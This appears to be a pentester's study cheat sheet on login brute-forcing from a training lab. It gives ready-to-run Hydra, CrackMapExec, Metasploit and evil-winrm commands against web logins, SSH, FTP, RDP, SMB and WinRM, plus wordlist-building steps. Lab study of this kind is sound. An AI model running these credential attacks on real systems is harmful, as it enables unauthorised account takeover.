#login-brute-forcing #hydra #Medusa #wfuzz #Ncrack #patator 


[[Custom Word Lists and Rules]]
[[Password Reuse - Default Passwords]]
[[Password Cracking]]

---
# Hydra

| **Command**                                                                                                                                                   | **Description**                                                                  |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `hydra -h`                                                                                                                                                    | hydra help                                                                       |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /`                                                                                                          | `Basic Auth` Brute Force - `Combined Wordlist`                                   |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /`                                                                                    | `Basic Auth` Brute Force - User/Pass Wordlists                                   |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`                        | `Login Form` Brute Force - Static User, Pass Wordlist                            |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4`                                                                                            | `SSH` Brute Force - User/Pass Wordlists                                          |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1`                                                                                                          | `FTP` Brute Force - Static User, Pass Wordlist                                   |
| `hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /`                | Basic Auth brute force trying `each user name against password` before moving on |
| `hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.254.53 -s 33944 http-get / `                       | flag 1 (skill assessment)                                                        |
| `hydra -l user -P /usr/share/wordlists/rockyou.txt -f 94.237.59.185 -s 47028 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"` | flag 2 (skill assessment)                                                        |
| `hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4`                                                                                          | Brute force `SSH`                                                                |
| `hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e`                                                                                | Search for available Hydra `request modules` for login brute forcing             |
| `hydra http-post-form -U`                                                                                                                                     | List all required parameters for `http-post-form`                                |
| `hydra -L user.list -P password.list ssh://10.129.42.197`                                                                                                     | Brute forcing `SSH`                                                              |
| `hydra -L user.list -P password.list rdp://10.129.42.197`                                                                                                     | Brute forcing `RDP`                                                              |
| `hydra -L user.list -P password.list smb://10.129.42.197`                                                                                                     | Brute forcing `SMB`                                                                                 |


---

# CrackMapExec

| Command                                                                                | Description                               |
| -------------------------------------------------------------------------------------- | ----------------------------------------- |
| `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` | The general format for using CrackMapExec |
| `crackmapexec winrm 10.129.42.197 -u user.list -p password.list`                       | Brute forcing `WinRM`                     |
|                                                                                        |                                           |

---
# Wordlists

| **Command**                                                                                 | **Description**            |
| ------------------------------------------------------------------------------------------- | -------------------------- |
| `/usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist |
| `/usr/share/wordlists/rockyou.txt`                                                          | Common Passwords Wordlist  |
| `/opt/useful/SecLists/Usernames/Names/names.txt`                                            | Common Names Wordlist      |


---

# Misc

| **Command**                                             | **Description**                        |
| ------------------------------------------------------- | -------------------------------------- |
| `cupp -i`                                               | Creating Custom Password Wordlist      |
| `sed -ri '/^.{,7}$/d' william.txt`                      | Remove Passwords Shorter Than 8        |
| ``sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``         | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt`                      | Remove Passwords With No Numbers       |
| `./username-anarchy Bill Gates > bill.txt`              | Generate Usernames List                |
| `ssh b.gates@SERVER_IP -p PORT`                         | SSH to Server                          |
| `ftp 127.0.0.1`                                         | FTP to Server                          |
| `su - user`                                             | Switch to User                         |
| `evil-winrm -i <target-IP> -u <username> -p <password>` | Connecting to `WinRM`                  |
| `use auxiliary/scanner/smb/smb_login`                   | Metasploit `SMB` brute force module                                       |
 

---

# Tools

| Name                               | Description                                                      | LInk                                                |
| ---------------------------------- | ---------------------------------------------------------------- | --------------------------------------------------- |
| wfuzz                              |                                                                  |                                                     |
| Ncrack                             |                                                                  |                                                     |
| medusa                             |                                                                  |                                                     |
| patator                            |                                                                  |                                                     |
| hydra                              |                                                                  |                                                     |
| username-anarchy                   | Create `personalised user name` list                             |                                                     |
| Cupp                               | Create `custom password` list                                    |                                                     |
| The Default Credential Cheat Sheet | One place for all the `default credentials` to assist pentesters | https://github.com/ihebski/DefaultCreds-cheat-sheet |
|                                    |                                                                  |                                                     |


---